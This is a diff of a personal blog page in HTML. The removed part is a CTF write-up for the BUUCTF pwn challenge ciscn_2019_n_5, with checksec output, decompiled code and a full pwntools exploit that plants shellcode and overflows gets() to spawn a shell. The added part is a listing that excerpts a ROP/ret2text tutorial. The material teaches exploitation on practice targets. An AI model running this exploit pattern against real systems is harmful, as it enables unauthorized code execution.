@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8" >
 
-<title>每日1+（认怂了） | nianchu</title>
+<title>nianchu</title>
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 
@@ -12,24 +12,14 @@
 <link rel="stylesheet" href="https://cc-nianchu.github.io/styles/main.css">
 
 
-  
-
-  
-    <link rel="stylesheet" href="https://unpkg.com/disqusjs@1.1/dist/disqusjs.css" />
-  
-
 
 <link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
 <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
 
 
 
-    <meta name="description" content="buu ciscn_2019_n_5
-在buu上拿到附件 checksec一下
-    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canar..." />
-    <meta name="keywords" content="" />
+    <meta name="description" content="nianchu的blog">
+    
   </head>
   <body>
     <div id="app" class="main">
@@ -99,75 +89,37 @@
 
       <div class="main-container">
         <div class="content-container" data-aos="fade-up">
-          <div class="post-detail">
-            <h2 class="post-title">每日1+（认怂了）</h2>
-            <div class="post-date">2021-08-03</div>
-            
-            <div class="post-content" v-pre>
-              <h2 id="buu-ciscn_2019_n_5">buu ciscn_2019_n_5</h2>
-<p>在buu上拿到附件 checksec一下</p>
-<pre><code>    Arch:     amd64-64-little
-    RELRO:    Partial RELRO
-    Stack:    No canary found
-    NX:       NX disabled
-    PIE:      No PIE (0x400000)
-    RWX:      Has RWX segments
-</code></pre>
-<p>发现这是64位系统 没开任何保护<br>
-打开ida64  找到main函数按F5获得伪代码</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  char text[30]; // [rsp+0h] [rbp-20h] BYREF
-
-  setvbuf(stdout, 0LL, 2, 0LL);
-  puts(&quot;tell me your name&quot;);
-  read(0, name, 0x64uLL);
-  puts(&quot;wow~ nice name!&quot;);
-  puts(&quot;What do you want to say to me?&quot;);
-  gets(text);
-  return 0;
-}
-</code></pre>
-<p>发现第一次让我们输入名字 然后限制长度为0x64  并且name是在.bss段上<br>
-第二次是利用gets函数，没有限制长度，可以用gets函数进行溢出<br>
-我们得思路是:<br>
-第一个漏洞写入shellcode<br>
-然后第二个漏洞溢出去到name参数去然后执行shellcode拿到shell<br>
-exp:</p>
-<pre><code>from pwn import*
-
-q=remote('node4.buuoj.cn',25042)
-
-q.sendlineafter('tell me your name',asm(shellcraft.sh()))
-
-payload='a'*0x28+p64(0x601080)
-q.sendlineafter('What do you want to say to me?',payload)
-
-q.interactive()
-</code></pre>
-
-            </div>
-            
-            
-              <div class="next-post">
-                <div class="next">下一篇</div>
-                <a href="https://cc-nianchu.github.io/post/mei-ri-3/">
-                  <h3 class="post-title">
-                    每日3+
-                  </h3>
+          
+            <article class="post-item">
+              <div class="left">
+                <a href="https://cc-nianchu.github.io/post/gou-zao-ji-ben-rop/">
+                  <h2 class="post-title">构造基本rop</h2>
                 </a>
+                <div class="post-date">
+                  2021-07-14
+                </div>
+                <div class="post-abstract">
+                  <pre><code> 能构造rop的题目得满足一下条件：
+        程序存在溢出，并且可以控制返回地址。
+        可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
+</code></pre>
+<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。😳</p>
+<h2 id="ret2text">ret2text</h2>
+<p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP;<br>
+做题目前首先得查看一下程序的保护机制</p>
+
+                </div>
               </div>
-            
-
-            
               
+            </article>
+          
 
-              
-                <div id="disqus_thread" data-aos="fade-in"></div>
-              
-            
-
-          </div>
+          <div class="pagination-container">
+  
+    <a href="https://cc-nianchu.github.io/" class="prev"><i class="icon-arrow-ios-back-outline"></i> 上一页</a>
+  
+  
+</div>
 
         </div>
       </div>
@@ -193,26 +145,6 @@ var app = new Vue({
     hljs.initHighlightingOnLoad()
   </script>
 
-
-
-
-  
-
-  
-    <script src="https://unpkg.com/disqusjs@1.1/dist/disqus.js"></script>
-    <script>
-
-    var options = {
-      shortname: '',
-      apikey: '',
-    }
-    if ('') {
-      options.api = ''
-    }
-    var dsqjs = new DisqusJS(options)
-
-    </script>
-  
 
 
 
